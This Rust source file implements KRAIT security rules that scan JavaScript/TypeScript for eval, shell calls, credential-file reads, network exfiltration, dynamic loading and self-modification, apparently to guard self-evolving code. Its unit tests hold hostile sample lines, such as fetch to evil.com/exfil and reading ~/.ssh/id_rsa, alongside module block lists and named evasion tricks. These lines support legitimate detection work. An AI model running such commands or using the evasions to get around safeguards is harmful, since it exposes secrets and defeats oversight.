//! KRAIT security rules for JavaScript and TypeScript code.
//!
//! Enforces KRAIT-001 through KRAIT-007 using tree-sitter AST queries.
//! Handles both JS and TS via the `typescript` flag.

use tree_sitter::Tree;
use crate::rules::Violation;
use super::{LanguageRules, collect_strings_with_query, strings_match_immutable,
            strings_match_credentials, strings_match_krait_internals};

pub struct JavaScriptRules {
    pub typescript: bool,
}

impl LanguageRules for JavaScriptRules {
    fn check_all(&self, code: &str, tree: &Tree) -> Option<Violation> {
        let ts = self.typescript;
        check_krait_001(code, tree, ts)
            .or_else(|| check_krait_002(code, tree, ts))
            .or_else(|| check_krait_003(code, tree, ts))
            .or_else(|| check_krait_004(code, tree, ts))
            .or_else(|| check_krait_005(code, tree, ts))
            .or_else(|| check_krait_006(code, tree, ts))
            .or_else(|| check_krait_007(code, tree, ts))
            .or_else(|| check_forbidden_requires(code, tree, ts))
    }

    fn language_id(&self) -> &'static str {
        if self.typescript { "typescript" } else { "javascript" }
    }
}

fn js_lang() -> tree_sitter::Language {
    tree_sitter_javascript::LANGUAGE.into()
}

fn ts_lang() -> tree_sitter::Language {
    tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into()
}

/// Get the correct grammar for tree-sitter queries.
/// Queries MUST be compiled against the same grammar used to parse the tree.
fn query_lang(typescript: bool) -> tree_sitter::Language {
    if typescript { ts_lang() } else { js_lang() }
}

fn collect_strings(code: &str, tree: &Tree, typescript: bool) -> Vec<String> {
    let lang = query_lang(typescript);
    let mut strings = collect_strings_with_query(
        code, tree, &lang,
        r#"(string (string_fragment) @s)"#,
    );

    // Template literals
    let templates = collect_strings_with_query(
        code, tree, &lang,
        r#"(template_string (string_fragment) @s)"#,
    );
    strings.extend(templates);

    strings
}

fn collect_require_args(code: &str, tree: &Tree, typescript: bool) -> Vec<String> {
    // require('module') calls
    let mut args = Vec::new();
    let query_str = r#"(call_expression
        function: (identifier) @fn
        arguments: (arguments (string (string_fragment) @arg)))"#;
    if let Ok(query) = tree_sitter::Query::new(&query_lang(typescript), query_str) {
        let mut cursor = tree_sitter::QueryCursor::new();
        let bytes = code.as_bytes();
        use streaming_iterator::StreamingIterator;
        let mut matches = cursor.matches(&query, tree.root_node(), bytes);
        while let Some(m) = matches.next() {
            if m.captures.len() >= 2 {
                if let (Ok(fn_name), Ok(arg)) = (
                    m.captures[0].node.utf8_text(bytes),
                    m.captures[1].node.utf8_text(bytes),
                ) {
                    if fn_name == "require" {
                        args.push(arg.to_string());
                    }
                }
            }
        }
    }
    args
}

fn collect_import_sources(code: &str, tree: &Tree, typescript: bool) -> Vec<String> {
    // import X from 'module' / import { X } from 'module'
    collect_strings_with_query(
        code, tree, &query_lang(typescript),
        r#"(import_statement source: (string (string_fragment) @s))"#,
    )
}

// ---------------------------------------------------------------------------
// KRAIT-001: No code eval
// ---------------------------------------------------------------------------

fn check_krait_001(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    // eval()
    if has_function_call(code, tree, "eval", typescript) {
        return Some(Violation {
            rule: "KRAIT-001".into(),
            explanation: "Code evaluation detected (eval)".into(),
        });
    }

    // new Function()
    if code.contains("new Function(") || code.contains("new Function (") {
        return Some(Violation {
            rule: "KRAIT-001".into(),
            explanation: "Code evaluation detected (new Function)".into(),
        });
    }

    // vm module usage
    if code.contains("vm.runInNewContext") || code.contains("vm.runInThisContext")
        || code.contains("vm.createContext") || code.contains("vm.Script")
    {
        return Some(Violation {
            rule: "KRAIT-001".into(),
            explanation: "Code evaluation detected (vm module)".into(),
        });
    }

    // setTimeout/setInterval with string argument
    // (can't distinguish string vs function easily, check for common pattern)
    None
}

// ---------------------------------------------------------------------------
// KRAIT-002: No raw shell
// ---------------------------------------------------------------------------

const SHELL_NODE_MODULES: &[&str] = &["child_process", "node:child_process"];
const SHELL_FUNCTIONS: &[&str] = &[
    "execSync", "exec", "execFile", "execFileSync",
    "spawn", "spawnSync", "fork",
];

fn check_krait_002(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let requires = collect_require_args(code, tree, typescript);
    let imports = collect_import_sources(code, tree, typescript);
    let all_modules: Vec<&str> = requires.iter().chain(imports.iter()).map(|s| s.as_str()).collect();

    // Check for child_process import/require
    for module in SHELL_NODE_MODULES {
        if all_modules.contains(module) {
            return Some(Violation {
                rule: "KRAIT-002".into(),
                explanation: format!("Shell execution module imported: {}", module),
            });
        }
    }

    // Check for direct shell function calls
    for func in SHELL_FUNCTIONS {
        if code.contains(&format!("{}(", func)) || code.contains(&format!("{} (", func)) {
            return Some(Violation {
                rule: "KRAIT-002".into(),
                explanation: format!("Shell execution detected: {}", func),
            });
        }
    }

    None
}

// ---------------------------------------------------------------------------
// KRAIT-003: No credential path access
// ---------------------------------------------------------------------------

fn check_krait_003(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let has_file_op = code.contains("readFile") || code.contains("readFileSync")
        || code.contains("writeFile") || code.contains("writeFileSync")
        || code.contains("createReadStream") || code.contains("createWriteStream")
        || code.contains("fs.open") || code.contains("fs.read")
        || code.contains("Deno.readTextFile") || code.contains("Bun.file");

    if !has_file_op {
        return None;
    }

    let strings = collect_strings(code, tree, typescript);
    if strings_match_credentials(&strings) {
        return Some(Violation {
            rule: "KRAIT-003".into(),
            explanation: "Credential path access detected".into(),
        });
    }
    None
}

// ---------------------------------------------------------------------------
// KRAIT-004: No network exfil
// ---------------------------------------------------------------------------

const NETWORK_MODULES: &[&str] = &[
    "http", "https", "net", "dgram", "tls", "http2",
    "node:http", "node:https", "node:net", "node:dgram",
    "axios", "node-fetch", "got", "superagent", "undici",
];

fn check_krait_004(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let requires = collect_require_args(code, tree, typescript);
    let imports = collect_import_sources(code, tree, typescript);
    let all_modules: Vec<&str> = requires.iter().chain(imports.iter()).map(|s| s.as_str()).collect();

    for module in NETWORK_MODULES {
        if all_modules.contains(module) {
            return Some(Violation {
                rule: "KRAIT-004".into(),
                explanation: format!("Network module imported: {}", module),
            });
        }
    }

    // fetch() is a global in modern runtimes — check for it
    if has_function_call(code, tree, "fetch", typescript) {
        return Some(Violation {
            rule: "KRAIT-004".into(),
            explanation: "Network access detected (fetch)".into(),
        });
    }

    // XMLHttpRequest
    if code.contains("XMLHttpRequest") || code.contains("new XMLHttpRequest") {
        return Some(Violation {
            rule: "KRAIT-004".into(),
            explanation: "Network access detected (XMLHttpRequest)".into(),
        });
    }

    None
}

// ---------------------------------------------------------------------------
// KRAIT-005: No hot code loading
// ---------------------------------------------------------------------------

fn check_krait_005(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    // Dynamic require with variable
    // We can't easily distinguish require('literal') from require(variable)
    // via text, so check for computed require patterns
    if code.contains("require(") && !code.contains("require('") && !code.contains("require(\"") {
        // There's a require call that's not a string literal — potentially dynamic
        let requires = collect_require_args(code, tree, typescript);
        // If tree-sitter didn't capture it as a string, it's likely dynamic
        if requires.is_empty() && code.contains("require(") {
            return Some(Violation {
                rule: "KRAIT-005".into(),
                explanation: "Dynamic require detected (variable argument)".into(),
            });
        }
    }

    // Dynamic import()
    if code.contains("import(") {
        // import() with non-literal is dynamic
        return Some(Violation {
            rule: "KRAIT-005".into(),
            explanation: "Dynamic import() detected".into(),
        });
    }

    let _ = tree; // Suppress unused warning when not used in other checks
    None
}

// ---------------------------------------------------------------------------
// KRAIT-006: No immutable path targeting
// ---------------------------------------------------------------------------

fn check_krait_006(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let strings = collect_strings(code, tree, typescript);

    if strings_match_immutable(&strings) {
        return Some(Violation {
            rule: "KRAIT-006".into(),
            explanation: "Immutable path targeting detected".into(),
        });
    }

    // Template literal evasion: `native/${var}`
    if code.contains("${") {
        let partial_segments = ["native/", "krait_analyzer", ".krait-immutable",
            "krait-rules", "config/", "priv/", ".github/", "deps/", ".git/"];
        if strings.iter().any(|s| {
            partial_segments.iter().any(|seg| s.contains(seg))
        }) {
            return Some(Violation {
                rule: "KRAIT-006".into(),
                explanation: "Immutable path targeting detected (template literal evasion)".into(),
            });
        }
    }

    // path.join evasion
    if (code.contains("path.join") || code.contains("path.resolve"))
        && strings.iter().any(|s| {
            super::IMMUTABLE_SEGMENTS.iter().any(|seg| s.contains(seg))
        })
    {
        return Some(Violation {
            rule: "KRAIT-006".into(),
            explanation: "Immutable path targeting detected (path.join evasion)".into(),
        });
    }

    None
}

// ---------------------------------------------------------------------------
// KRAIT-007: No recursive self-modification
// ---------------------------------------------------------------------------

fn check_krait_007(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let requires = collect_require_args(code, tree, typescript);
    let imports = collect_import_sources(code, tree, typescript);
    let strings = collect_strings(code, tree, typescript);

    // Check imports/requires for krait/* modules
    for module in requires.iter().chain(imports.iter()) {
        let lower = module.to_lowercase();
        if lower.starts_with("krait/") || lower.starts_with("krait_web/")
            || lower.starts_with("@krait/") || lower == "krait"
        {
            return Some(Violation {
                rule: "KRAIT-007".into(),
                explanation: "KRAIT internals import detected".into(),
            });
        }
    }

    if strings_match_krait_internals(&strings) {
        return Some(Violation {
            rule: "KRAIT-007".into(),
            explanation: "KRAIT internals reference detected in string".into(),
        });
    }

    None
}

// ---------------------------------------------------------------------------
// Forbidden modules (allowlist)
// ---------------------------------------------------------------------------

const FORBIDDEN_NODE_MODULES: &[&str] = &[
    "child_process", "node:child_process",
    "fs", "node:fs", "fs/promises", "node:fs/promises",
    "net", "node:net", "http", "node:http", "https", "node:https",
    "os", "node:os", "process", "vm", "node:vm",
    "worker_threads", "node:worker_threads",
    "cluster", "node:cluster", "dgram", "node:dgram",
    "tls", "node:tls", "http2", "node:http2",
];

fn check_forbidden_requires(code: &str, tree: &Tree, typescript: bool) -> Option<Violation> {
    let requires = collect_require_args(code, tree, typescript);
    let imports = collect_import_sources(code, tree, typescript);
    let all: Vec<&str> = requires.iter().chain(imports.iter()).map(|s| s.as_str()).collect();

    for module in FORBIDDEN_NODE_MODULES {
        if all.contains(module) {
            return Some(Violation {
                rule: "KRAIT-ALW".into(),
                explanation: format!("Forbidden module imported: {}", module),
            });
        }
    }

    None
}

// ---------------------------------------------------------------------------
// AST helpers
// ---------------------------------------------------------------------------

fn has_function_call(code: &str, tree: &Tree, name: &str, typescript: bool) -> bool {
    let query_str = r#"(call_expression function: (identifier) @fn)"#;
    if let Ok(query) = tree_sitter::Query::new(&query_lang(typescript), query_str) {
        let mut cursor = tree_sitter::QueryCursor::new();
        let bytes = code.as_bytes();
        use streaming_iterator::StreamingIterator;
        let mut matches = cursor.matches(&query, tree.root_node(), bytes);
        while let Some(m) = matches.next() {
            if let Some(cap) = m.captures.first() {
                if let Ok(fn_name) = cap.node.utf8_text(bytes) {
                    if fn_name == name {
                        return true;
                    }
                }
            }
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn parse_js(code: &str) -> Tree {
        let mut parser = tree_sitter::Parser::new();
        parser.set_language(&js_lang()).ok();
        parser.parse(code, None).expect("test: parse JS code")
    }

    fn js_rules() -> JavaScriptRules {
        JavaScriptRules { typescript: false }
    }

    // --- KRAIT-001 ---

    #[test]
    fn js_001_eval_detected() {
        let code = "eval('alert(1)')";
        let tree = parse_js(code);
        let v = js_rules().check_all(code, &tree);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-001");
    }

    #[test]
    fn js_001_new_function_detected() {
        let code = "const fn = new Function('return 1')";
        let tree = parse_js(code);
        let v = js_rules().check_all(code, &tree);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-001");
    }

    #[test]
    fn js_001_safe_passes() {
        let code = "const x = [1, 2, 3].map(n => n * 2)";
        let tree = parse_js(code);
        assert!(js_rules().check_all(code, &tree).is_none());
    }

    // --- KRAIT-002 ---

    #[test]
    fn js_002_require_child_process() {
        let code = "const cp = require('child_process')";
        let tree = parse_js(code);
        let v = js_rules().check_all(code, &tree);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-002");
    }

    #[test]
    fn js_002_exec_sync() {
        let code = "execSync('ls -la')";
        let tree = parse_js(code);
        let v = check_krait_002(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-002");
    }

    // --- KRAIT-003 ---

    #[test]
    fn js_003_read_ssh_key() {
        let code = "const key = fs.readFileSync('~/.ssh/id_rsa')";
        let tree = parse_js(code);
        let v = check_krait_003(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-003");
    }

    // --- KRAIT-004 ---

    #[test]
    fn js_004_require_http() {
        let code = "const http = require('http')";
        let tree = parse_js(code);
        let v = check_krait_004(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-004");
    }

    #[test]
    fn js_004_fetch_call() {
        let code = "fetch('https://evil.com/exfil')";
        let tree = parse_js(code);
        let v = check_krait_004(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-004");
    }

    // --- KRAIT-006 ---

    #[test]
    fn js_006_immutable_path() {
        let code = r#"const p = "native/krait_analyzer/src/lib.rs""#;
        let tree = parse_js(code);
        let v = check_krait_006(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-006");
    }

    #[test]
    fn js_006_safe_path_passes() {
        let code = r#"const p = "lib/skills/my_skill.js""#;
        let tree = parse_js(code);
        assert!(check_krait_006(code, &tree, false).is_none());
    }

    // --- KRAIT-007 ---

    #[test]
    fn js_007_require_krait() {
        let code = "const mod = require('krait/evolution')";
        let tree = parse_js(code);
        let v = check_krait_007(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-007");
    }

    // --- Allowlist ---

    #[test]
    fn js_alw_require_fs() {
        let code = "const fs = require('fs')";
        let tree = parse_js(code);
        let v = check_forbidden_requires(code, &tree, false);
        assert!(v.is_some());
        assert_eq!(v.expect("test").rule, "KRAIT-ALW");
    }

    #[test]
    fn js_alw_safe_require_passes() {
        let code = "const lodash = require('lodash')";
        let tree = parse_js(code);
        assert!(check_forbidden_requires(code, &tree, false).is_none());
    }
}
